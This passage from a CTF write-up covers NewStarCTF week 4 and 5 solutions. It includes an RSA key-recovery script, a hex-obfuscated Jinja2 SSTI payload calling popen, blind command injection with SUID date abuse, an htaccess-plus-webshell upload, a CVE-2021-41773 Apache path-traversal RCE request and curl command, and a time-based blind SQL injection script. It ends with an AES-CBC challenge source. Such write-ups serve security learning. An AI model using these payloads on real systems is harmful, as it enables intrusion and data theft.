</span></span><span class=line><span class=cl><span class=n>d2</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=n>e2</span><span class=p>,</span> <span class=n>phi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d3</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=n>e3</span><span class=p>,</span> <span class=n>phi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gift_from_fallwind</span> <span class=o>=</span> <span class=n>d2</span> <span class=o>-</span> <span class=n>d1</span>
</span></span><span class=line><span class=cl><span class=n>sp</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span> <span class=o>//</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>m1</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=n>sp</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>m2</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=n>sp</span><span class=p>:</span> <span class=mi>2</span><span class=o>*</span><span class=n>sp</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>m3</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>2</span><span class=o>*</span><span class=n>sp</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>c1</span><span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>m1</span><span class=p>,</span> <span class=n>e1</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c2</span><span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>m2</span><span class=p>,</span> <span class=n>e2</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c3</span><span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>m3</span><span class=p>,</span> <span class=n>e3</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;n = </span><span class=si>{</span><span class=n>n</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;e1 = </span><span class=si>{</span><span class=n>e1</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;e2 = </span><span class=si>{</span><span class=n>e2</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;e3 = </span><span class=si>{</span><span class=n>e3</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;c1 = </span><span class=si>{</span><span class=n>c1</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;c2 = </span><span class=si>{</span><span class=n>c2</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;c3 = </span><span class=si>{</span><span class=n>c3</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;gift_from_fallwind = </span><span class=si>{</span><span class=n>gift_from_fallwind</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>n</span> <span class=o>=</span> <span class=m>714592173868259951547903824656567142382519201815807137392662736000480461106944240411907971077744283561181468187349950157770542641452016168710768060100431878635594871092115167496636869765435245733216244455291669985854820686150487479060100362374214950338593785006799039892489525125499595277195821419495485780569578409849268011672935670978669183434574625404664252352238179018153026065565737180327403650490113961989352069795255693066847568569258596045200617988242378417608661573561288798387013713959291514998718810340095720086582431808535500784877130015856483311803720730193251968718389940211890886176473856457082812043712013634688479195044004890584238387779313840532514565194377261080408568578839974414957533288241409106206637332990105576057838430267703746376981194305776942499262213827373958311438790046259142383469934115411137484269094594634801601455381187640866738280586324069047262621776502056490534194678730988305691412586133810702956723819024793893235153104715079346666767828770304227597496868066084967074574249861996861449220457370695654952738759446674531850565616794250604969906523629086439326216263355721761747979532714573810102811235244618245569028203230483116293028005467298691574981713677092048315265963514382056811642161463</span>
</span></span><span class=line><span class=cl><span class=nv>e1</span> <span class=o>=</span> <span class=m>42407</span>
</span></span><span class=line><span class=cl><span class=nv>e2</span> <span class=o>=</span> <span class=m>42299</span>
</span></span><span class=line><span class=cl><span class=nv>e3</span> <span class=o>=</span> <span class=m>64279</span>
</span></span><span class=line><span class=cl><span class=nv>c1</span> <span class=o>=</span> <span class=m>147746559360802924168767659277705450630485609696398746571701418818848770182885487620535212747337538428905143459150636194921920646777706320249140903061217676389530668645622949973659702291367297066656754690100263868506461956113055815101461657779702873682097533482492493899104205046186278766341878854368500917007433940486307279045874511368494257897755625125620904196433190777249505786257092826031743302124873284619940344765699423310728402472381757497703327215054987663079091464775324695334786123993004899881875932719629531115443494782427464033199136840262965875592542948702903121840007890458510167896574258848373182376940828605330277069434815885568024582498080844909563591272397488770838751339866638704837915487427276557777372613819511517108295620835412232055690690331814390700825513053666493393942792555525632325524757429986865995789852014588602452362551730826736918369894537815766447265166762601145909581089407049818337486974627574263275878986623999208215467068257094963543761810512552366121738916812287617877452022267220425292446818899145860109087267084524150679796547645233300059224249369109340663349590685107672065377058337980842108933489505620025066451603214522163014130542079244955200533246817511795384645564870718654306017093880</span>
</span></span><span class=line><span class=cl><span class=nv>c2</span> <span class=o>=</span> <span class=m>337796038485337223816475984950456810748129968181260652436798659350041388661303298381024293567858637131784295193867689006379455173201801538614335070721020735891108350570605513554850505589909457080361317990263630725721623909042708574097188905696426452814443072330582517110013425687309570310925148848467651593011914844474279987415423796247841257536637823609202705263533635281512231854231077727153008468034663708367221732104195468247696442441086937944990689793952230215990824397909249441015759060017517894957594510803336664512608128010545289784049784177611524398804382654716236024276493647659224649016999444437679713035528891917192417814659613017511330578462974624880551299057883811283033946146889355467779050967361027087080352841747836678980418533840472145655131425703508683270849398801701504340623072029235085830962038699908963834215641154556517289466852886243166207700576530398250363365976100132377349909530093158372007815925018963904011651612576427055409180229217198739845333777332027781322479300353269326257620342214186859996302004152073249996007973827806898128006273636862496964659067036495886736584255338505886284353124133030688669501417184690143652760207937780991619589875885728364937580912382631625198455389969845802240231827163</span>
</span></span><span class=line><span class=cl><span class=nv>c3</span> <span class=o>=</span> <span class=m>424077500283538548695429029734927642518438524525805172568745880982861798954369892065855075306396658578715593140988681322211943800827469098807795208943724228288132152970084568728843669855312178059145983168245747282178118927927118026053179993918910256713266934916520151359475678446638810022833365506023312578408649890108868706577071610442415250434663703848788000124360027832658586954993369200881819393055860013390887044444898844318376925700215369036711799193621862491000483927756231147580685621531144248717419030824674055599055717010063636336702022163459269369324701987636772581709509640297923613071083421937504088720011643179567005037514310053762735787172663099935520119785909997287518567706508640150762285653766660798661964916169965639164375045609322144422628622388969490052285300841751657575450486389268063959043056821417358486314747981330380819421643688151487077209015995287339609841113765813462834471270766622938036101602597257457988755053683191621395473412095142041134027974560324126052952093513827172817662085883985649068515306916979488707694772473239863027480932340145990906115024722682989661592015805559935349596282010900810573490368602483785908673810154811269934225750196861258621132739166572297393817253205915435333491161203</span>
</span></span><span class=line><span class=cl><span class=nv>gift_from_fallwind</span> <span class=o>=</span> <span class=m>436057126906623515829218011238744316017674469205661117597268470150957758251976942445150879861108983042930734360653000973980600283904101499137333865224021780243160123582776537464659885717072177232387979780155820186376822704547514869653697300455384885557911728798950305201936973078685581794365075352341541134238714464727825137128067542739078985472265837037034067906587445615146595102552611894550913742780821268889878629177560903295511218320565910385133911886947889495561650713735268032963799756628442264275798506978864616008762967965435601210553178014009864471368535327898667309420704800396343299194692424445757081230545316510925050736165766681764700768348825662815908360495749201689747586178884303154943439689695756080847567228630187446741488386672483582019385735879376786013583105010830909520853067056907311999554079858869757789193026155282645740531423042696088661716948429683650063340097187696375083991311139748519133745606598795309849873485013934772051034350080361176801194568727665884824462291930504184029406404464952205159309484625000859491407470043008763418189126078287693565790619787102318883565462574011050013632489624673181763059753755492153825048101618871500056894854231049792292739927027237110872703608633932490764567008732</span>
</span></span></code></pre></div><p>e1 * d1=e2 * d2 (mod phi) ==> e1 * e2 * (d2-d1)-(e1-e2)=kphi</p><p>e1 * d4 = 1 (mod kphi) ==> d4 = d1 (mod phi)</p><p>exp：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>714592173868259951547903824656567142382519201815807137392662736000480461106944240411907971077744283561181468187349950157770542641452016168710768060100431878635594871092115167496636869765435245733216244455291669985854820686150487479060100362374214950338593785006799039892489525125499595277195821419495485780569578409849268011672935670978669183434574625404664252352238179018153026065565737180327403650490113961989352069795255693066847568569258596045200617988242378417608661573561288798387013713959291514998718810340095720086582431808535500784877130015856483311803720730193251968718389940211890886176473856457082812043712013634688479195044004890584238387779313840532514565194377261080408568578839974414957533288241409106206637332990105576057838430267703746376981194305776942499262213827373958311438790046259142383469934115411137484269094594634801601455381187640866738280586324069047262621776502056490534194678730988305691412586133810702956723819024793893235153104715079346666767828770304227597496868066084967074574249861996861449220457370695654952738759446674531850565616794250604969906523629086439326216263355721761747979532714573810102811235244618245569028203230483116293028005467298691574981713677092048315265963514382056811642161463</span>
</span></span><span class=line><span class=cl><span class=n>e1</span> <span class=o>=</span> <span class=mi>42407</span>
</span></span><span class=line><span class=cl><span class=n>e2</span> <span class=o>=</span> <span class=mi>42299</span>
</span></span><span class=line><span class=cl><span class=n>e3</span> <span class=o>=</span> <span class=mi>64279</span>
</span></span><span class=line><span class=cl><span class=n>c1</span> <span class=o>=</span> <span class=mi>147746559360802924168767659277705450630485609696398746571701418818848770182885487620535212747337538428905143459150636194921920646777706320249140903061217676389530668645622949973659702291367297066656754690100263868506461956113055815101461657779702873682097533482492493899104205046186278766341878854368500917007433940486307279045874511368494257897755625125620904196433190777249505786257092826031743302124873284619940344765699423310728402472381757497703327215054987663079091464775324695334786123993004899881875932719629531115443494782427464033199136840262965875592542948702903121840007890458510167896574258848373182376940828605330277069434815885568024582498080844909563591272397488770838751339866638704837915487427276557777372613819511517108295620835412232055690690331814390700825513053666493393942792555525632325524757429986865995789852014588602452362551730826736918369894537815766447265166762601145909581089407049818337486974627574263275878986623999208215467068257094963543761810512552366121738916812287617877452022267220425292446818899145860109087267084524150679796547645233300059224249369109340663349590685107672065377058337980842108933489505620025066451603214522163014130542079244955200533246817511795384645564870718654306017093880</span>
</span></span><span class=line><span class=cl><span class=n>c2</span> <span class=o>=</span> <span class=mi>337796038485337223816475984950456810748129968181260652436798659350041388661303298381024293567858637131784295193867689006379455173201801538614335070721020735891108350570605513554850505589909457080361317990263630725721623909042708574097188905696426452814443072330582517110013425687309570310925148848467651593011914844474279987415423796247841257536637823609202705263533635281512231854231077727153008468034663708367221732104195468247696442441086937944990689793952230215990824397909249441015759060017517894957594510803336664512608128010545289784049784177611524398804382654716236024276493647659224649016999444437679713035528891917192417814659613017511330578462974624880551299057883811283033946146889355467779050967361027087080352841747836678980418533840472145655131425703508683270849398801701504340623072029235085830962038699908963834215641154556517289466852886243166207700576530398250363365976100132377349909530093158372007815925018963904011651612576427055409180229217198739845333777332027781322479300353269326257620342214186859996302004152073249996007973827806898128006273636862496964659067036495886736584255338505886284353124133030688669501417184690143652760207937780991619589875885728364937580912382631625198455389969845802240231827163</span>
</span></span><span class=line><span class=cl><span class=n>c3</span> <span class=o>=</span> <span class=mi>424077500283538548695429029734927642518438524525805172568745880982861798954369892065855075306396658578715593140988681322211943800827469098807795208943724228288132152970084568728843669855312178059145983168245747282178118927927118026053179993918910256713266934916520151359475678446638810022833365506023312578408649890108868706577071610442415250434663703848788000124360027832658586954993369200881819393055860013390887044444898844318376925700215369036711799193621862491000483927756231147580685621531144248717419030824674055599055717010063636336702022163459269369324701987636772581709509640297923613071083421937504088720011643179567005037514310053762735787172663099935520119785909997287518567706508640150762285653766660798661964916169965639164375045609322144422628622388969490052285300841751657575450486389268063959043056821417358486314747981330380819421643688151487077209015995287339609841113765813462834471270766622938036101602597257457988755053683191621395473412095142041134027974560324126052952093513827172817662085883985649068515306916979488707694772473239863027480932340145990906115024722682989661592015805559935349596282010900810573490368602483785908673810154811269934225750196861258621132739166572297393817253205915435333491161203</span>
</span></span><span class=line><span class=cl><span class=n>g</span> <span class=o>=</span> <span class=mi>436057126906623515829218011238744316017674469205661117597268470150957758251976942445150879861108983042930734360653000973980600283904101499137333865224021780243160123582776537464659885717072177232387979780155820186376822704547514869653697300455384885557911728798950305201936973078685581794365075352341541134238714464727825137128067542739078985472265837037034067906587445615146595102552611894550913742780821268889878629177560903295511218320565910385133911886947889495561650713735268032963799756628442264275798506978864616008762967965435601210553178014009864471368535327898667309420704800396343299194692424445757081230545316510925050736165766681764700768348825662815908360495749201689747586178884303154943439689695756080847567228630187446741488386672483582019385735879376786013583105010830909520853067056907311999554079858869757789193026155282645740531423042696088661716948429683650063340097187696375083991311139748519133745606598795309849873485013934772051034350080361176801194568727665884824462291930504184029406404464952205159309484625000859491407470043008763418189126078287693565790619787102318883565462574011050013632489624673181763059753755492153825048101618871500056894854231049792292739927027237110872703608633932490764567008732</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>kphi</span> <span class=o>=</span> <span class=n>e1</span><span class=o>*</span><span class=n>e2</span><span class=o>*</span><span class=n>g</span><span class=o>-</span><span class=p>(</span><span class=n>e1</span><span class=o>-</span><span class=n>e2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d1</span> <span class=o>=</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>e1</span><span class=p>,</span><span class=n>kphi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d2</span> <span class=o>=</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>e2</span><span class=p>,</span><span class=n>kphi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d3</span> <span class=o>=</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>e3</span><span class=p>,</span><span class=n>kphi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m1</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>c1</span><span class=p>,</span><span class=n>d1</span><span class=p>,</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m2</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>c2</span><span class=p>,</span><span class=n>d2</span><span class=p>,</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m3</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>c3</span><span class=p>,</span><span class=n>d3</span><span class=p>,</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>m1</span><span class=p>)</span><span class=o>+</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>m2</span><span class=p>)</span><span class=o>+</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>m3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></div><h2 id=week5>week5</h2><h3 id=web-3>web</h3><h4 id=babyssti_three>BabySSTI_Three</h4><p>方括号加hex编码绕过</p><p>（hex编码不知道怎么用脚本写，都是手动，后面想想</p><p>payload：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>?name<span class=o>={{</span><span class=s1>&#39;&#39;</span><span class=o>[</span><span class=s1>&#39;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#39;</span><span class=o>][</span><span class=s1>&#39;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&#39;</span><span class=o>][</span>0<span class=o>][</span><span class=s1>&#39;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&#39;</span><span class=o>]()[</span>117<span class=o>][</span><span class=s1>&#39;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#39;</span><span class=o>][</span><span class=s1>&#39;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#39;</span><span class=o>][</span><span class=s1>&#39;\x70\x6f\x70\x65\x6e&#39;</span><span class=o>](</span><span class=s1>&#39;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x5f\x69\x6e\x5f\x68\x33\x72\x33\x5f\x35\x32\x64\x61\x61\x64&#39;</span><span class=o>)[</span><span class=s1>&#39;re&#39;&#39;ad&#39;</span><span class=o>]()}}}}</span>
</span></span></code></pre></div><h4 id=so-baby-rce-again>So Baby RCE Again</h4><p>shell_exec 无回显</p><p>ls || sleep 3，判断命令是否执行成功</p><p>可以访问网站目录下文件，将命令执行结果输出到index.txt</p><p>在根目录找到/ffll444aaggg，但无权访问</p><p>发现/bin/date执行权限为s，可以suid提权，将报错输出到index.txt</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>?cmd<span class=o>=</span>/bin/date -f /ffll444aaggg 2&gt; index.txt<span class=o>||</span>sleep <span class=m>3</span>
</span></span></code></pre></div><h4 id=give-me-your-photo-plz>Give me your photo PLZ</h4><p>文件上传</p><p>传.htaccess解析，再传后门</p><p>蚁剑连接，打开根目录flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>恭喜你做到这里，这周的比赛结束后，NewStarCTF也就告一段落了，不过，我们不希望这事你CTF旅途的终点，现在去env里面拿你真正的flag吧
</span></span></code></pre></div><p>env命令显示环境变量，得到flag</p><h4 id=unsafe-apache>Unsafe Apache</h4><p><a href=https://www.freebuf.com/articles/web/293172.html target=_blank rel="noopener noreffer">CVE-2021-41773 Apache HTTP Server 路径穿越漏洞复现 - FreeBuf网络安全行业门户</a></p><p>CVE-2021-41773，开启了cgi，可构造恶意请求执行命令</p><p>poc：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh
</span></span><span class=line><span class=cl><span class=c1># data</span>
</span></span><span class=line><span class=cl>echo<span class=p>;</span> ls /
</span></span></code></pre></div><p>exp:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh
</span></span><span class=line><span class=cl><span class=c1># data</span>
</span></span><span class=line><span class=cl>echo<span class=p>;</span> cat /ffffllllaaagggg_cc084c485d
</span></span></code></pre></div><p>curl:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl --date <span class=s2>&#34;echo;cat /ffffllllaaagggg_cc084c485d&#34;</span> <span class=s1>&#39;http://ip:port/cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh&#39;</span>
</span></span></code></pre></div><h4 id=final-round>Final round</h4><p>sql注入，无回显，非windows无法dnslog，只能时间盲注</p><p>/x0c绕过空格</p><p>（手动用上周的%0c成功，python中失败，怪</p><p>python</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span><span class=s1>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>chars</span> <span class=o>=</span> <span class=s1>&#39;abcdefghigklmnopqrstuvwxyz1234567890_}{ABCDEFGHJKLMNOPQRSTUVWXYZ&#39;</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://397dddcd-0381-4433-8612-6ea54b673db0.node4.buuoj.cn:81/comments.php&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>40</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>chars</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;100</span><span class=se>\x0c</span><span class=s2>and</span><span class=se>\x0c</span><span class=s2>if(ascii(substr((select</span><span class=se>\x0c</span><span class=s2>text</span><span class=se>\x0c</span><span class=s2>from</span><span class=se>\x0c</span><span class=s2>wfy_comments</span><span class=se>\x0c</span><span class=s2>where</span><span class=se>\x0c</span><span class=s2>id=100),</span><span class=si>{0}</span><span class=s2>,1))=</span><span class=si>{1}</span><span class=s2>,sleep(3),0)&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=nb>ord</span><span class=p>(</span><span class=n>char</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span><span class=n>timeout</span><span class=o>=</span><span class=mf>2.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=s2>&#34; &#34;</span><span class=p>,</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;flag is &#39;</span> <span class=o>+</span> <span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># flag{Ju2t_let_me_s1eep_f0r_a_whi1e}</span>
</span></span></code></pre></div><h3 id=crypto-3>crypto</h3><h4 id=flip-flop>flip-flop</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secret</span> <span class=kn>import</span> <span class=n>FLAG</span>
</span></span><span class=line><span class=cl><span class=n>auth_major_key</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BANNER</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>Login as admin to get the flag ! 
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>MENU</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>Enter your choice
</span></span></span><span class=line><span class=cl><span class=s2>[1] Create NewStarCTF Account
</span></span></span><span class=line><span class=cl><span class=s2>[2] Create Admin Account
</span></span></span><span class=line><span class=cl><span class=s2>[3] Login
</span></span></span><span class=line><span class=cl><span class=s2>[4] Exit
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>BANNER</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>MENU</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>option</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s1>&#39;&gt; &#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>auth_pt</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;NewStarCTFer____&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>user_key</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>auth_major_key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>user_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>auth_pt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;here is your authcode: </span><span class=si>{</span><span class=n>user_key</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span> <span class=o>+</span> <span class=n>code</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;GET OUT !!!!!!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>authcode</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;Enter your authcode &gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>user_key</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>authcode</span><span class=p>)[:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>authcode</span><span class=p>)[</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>auth_major_key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>user_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>auth_pt</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>auth_pt</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;AdminAdmin______&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>FLAG</span><span class=p>)</span>
